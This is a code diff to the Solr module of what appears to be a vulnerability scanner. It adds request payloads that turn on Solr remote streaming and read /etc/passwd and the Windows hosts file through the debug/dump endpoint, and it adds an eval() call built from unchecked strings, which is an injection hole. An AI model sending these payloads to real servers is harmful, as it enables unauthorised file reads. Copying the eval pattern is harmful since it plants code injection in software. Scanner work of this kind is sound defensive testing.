@@ -47,6 +47,26 @@ class Solr():
             {
                 'path': 'solr/{}/debug/dump',
                 'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
+            },
+            {
+                'path': 'admin/cores?indexInfo=false&wt=json',
+                'data': ''
+            },
+            {
+                'path': '{}/config',
+                'data': '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
+            },
+            {
+                'path': '{}/debug/dump',
+                'data': 'param=ContentStreams&stream.url=file:///etc/passwd'
+            },
+            {
+                'path': '{}/debug/dump',
+                'data': 'param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'
+            },
+            {
+                'path': '{}/debug/dump',
+                'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
             }
         ]
 
@@ -137,7 +157,10 @@ class Solr():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2021_27905_scan, url=url)
         ]
